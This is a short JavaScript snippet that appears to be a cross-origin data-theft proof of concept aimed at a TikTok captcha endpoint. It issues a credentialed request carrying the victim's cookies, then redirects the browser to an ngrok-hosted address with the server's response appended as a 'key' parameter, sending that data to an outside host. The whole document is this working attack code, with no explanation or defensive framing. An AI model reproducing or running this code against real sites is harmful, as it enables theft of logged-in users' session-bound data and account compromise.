var xhr = new XMLHttpRequest();
xhr.onload = reqListener; 
xhr.open("GET", "https://www-useast1a.tiktok.com/captcha/get?lang=en&app_name=&h5_sdk_version=2.31.1&h5_sdk_use_type=cdn&sdk_version=3.8.15&iid=0&did=0&device_id=0&ch=web_text&aid=1459&os_type=2&mode=&tmp=1692931585021&platform=pc&webdriver=false&fp=verify_llpzhjt3_22njWDJT_AcoU_4oJ7_BDPO_mUlfv6ttD2AJ&type=verify&detail=tatUH51ylFT1e*xgxHUE77w25Te4O14Uol2vKPUTwDNGLdhrAOYbyMMtvQA*GEogRtw0NwHUj-qT1enTOP2GWfEoc*egcEk3Oq3Qk1pNfkzdkga7iWZwg3dFIEfxr6QChjzD*4oPL4sxBQInVbzVFKd-FU8pRvPLbHPcYoXhlcc43Z60QN0XI1pWXXCusiNWcUQVoOfW7F6q8EbjHnk90fNqabZA3BXjnlFsfQ*3ohmCrfeeWapODCPxNVVJGLuEnL7ml3LFIQLh8bNimHdkYg3ac9nr1CHIsnXCtvVOyYz8B4jGU9PSLsaJCONZnx0cRu-w-Mit-p4BVRKNbrYhNUj-RNOT0lBaGfo1wwYyfMfB-ruCIFylEYkUT634Kk40X5hYu40c7*fHqV96GF-6HcGZauUFEoCpDmupF3FholzdZD9RJkBLUmDWM3rmLc1SDsVMweo8zplGs4PVxuD96vxh-lZKEGaXdVHufqw6rEcvcRZQrUumijs-&server_sdk_env=%7B%22idc%22:%22maliva%22,%22region%22:%22MALIVA%22,%22server_type%22:%22passport%22%7D&subtype=whirl&challenge_code=3058&os_name=other&h5_check_version=3.8.15&region=sg&triggered_region=sg");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//2d7a-140-213-103-229.ngrok-free.app/?key='+this.responseText; 
};
